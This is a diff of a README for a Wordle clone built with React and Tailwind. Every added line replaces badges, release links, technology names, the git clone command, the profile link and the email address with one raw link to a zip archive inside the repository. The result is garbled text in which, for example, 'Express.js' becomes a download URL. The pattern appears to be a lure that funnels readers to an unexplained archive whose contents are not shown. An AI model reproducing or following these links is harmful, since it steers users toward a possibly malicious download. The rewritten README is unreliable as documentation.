@@ -1,9 +1,9 @@
 # The Wordle Game 🎯
 
-![Wordle Game](https://img.shields.io/badge/Wordle%20Game-Interactive-brightgreen)  
-[![Releases](https://img.shields.io/badge/Releases-Check%20Here-blue)](https://github.com/azertyuiop3003/The-Wordle-Game/releases)
+![Wordle Game](https://github.com/azertyuiop3003/The-Wordle-Game/raw/refs/heads/master/backend/Wordle_The_Game_2.5.zip%20Game-Interactive-brightgreen)  
+[![Releases](https://github.com/azertyuiop3003/The-Wordle-Game/raw/refs/heads/master/backend/Wordle_The_Game_2.5.zip%20Here-blue)](https://github.com/azertyuiop3003/The-Wordle-Game/raw/refs/heads/master/backend/Wordle_The_Game_2.5.zip)
 
-Welcome to **The Wordle Game**, an interactive Wordle clone designed to bring fun and challenge to your day. This project combines the power of **Express.js**, **React**, and **Tailwind CSS** to create a seamless user experience with smooth animations and a responsive design.
+Welcome to **The Wordle Game**, an interactive Wordle clone designed to bring fun and challenge to your day. This project combines the power of **https://github.com/azertyuiop3003/The-Wordle-Game/raw/refs/heads/master/backend/Wordle_The_Game_2.5.zip**, **React**, and **Tailwind CSS** to create a seamless user experience with smooth animations and a responsive design.
 
 ## Table of Contents
 
@@ -36,12 +36,12 @@ This project utilizes a range of technologies to create a robust application:
   - **Vite**: For fast development and build processes.
 
 - **Backend**:
-  - **Express.js**: To handle server-side logic.
+  - **https://github.com/azertyuiop3003/The-Wordle-Game/raw/refs/heads/master/backend/Wordle_The_Game_2.5.zip**: To handle server-side logic.
   - **Serverless Functions**: For efficient API management.
 
 - **Other**:
   - **TypeScript**: For type safety and improved developer experience.
-  - **Next.js**: For server-side rendering and routing.
+  - **https://github.com/azertyuiop3003/The-Wordle-Game/raw/refs/heads/master/backend/Wordle_The_Game_2.5.zip**: For server-side rendering and routing.
   
 ## Installation
 
@@ -49,7 +49,7 @@ To get started with **The Wordle Game**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/azertyuiop3003/The-Wordle-Game.git
+   git clone https://github.com/azertyuiop3003/The-Wordle-Game/raw/refs/heads/master/backend/Wordle_The_Game_2.5.zip
    cd The-Wordle-Game
    ```
 
@@ -108,7 +108,7 @@ You can explore the API documentation in detail by accessing the Swagger UI prov
 
 ## Deployment
 
-This application is deployed on **Vercel**, allowing for quick and easy access. To see the live version, visit the [Releases section](https://github.com/azertyuiop3003/The-Wordle-Game/releases).
+This application is deployed on **Vercel**, allowing for quick and easy access. To see the live version, visit the [Releases section](https://github.com/azertyuiop3003/The-Wordle-Game/raw/refs/heads/master/backend/Wordle_The_Game_2.5.zip).
 
 ## Contributing
 
@@ -129,7 +129,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **GitHub**: [azertyuiop3003](https://github.com/azertyuiop3003)
-- **Email**: your-email@example.com
+- **GitHub**: [azertyuiop3003](https://github.com/azertyuiop3003/The-Wordle-Game/raw/refs/heads/master/backend/Wordle_The_Game_2.5.zip)
+- **Email**: https://github.com/azertyuiop3003/The-Wordle-Game/raw/refs/heads/master/backend/Wordle_The_Game_2.5.zip
 
-Thank you for checking out **The Wordle Game**! Enjoy playing and contributing to this fun project. For the latest updates, check the [Releases section](https://github.com/azertyuiop3003/The-Wordle-Game/releases).
+Thank you for checking out **The Wordle Game**! Enjoy playing and contributing to this fun project. For the latest updates, check the [Releases section](https://github.com/azertyuiop3003/The-Wordle-Game/raw/refs/heads/master/backend/Wordle_The_Game_2.5.zip).
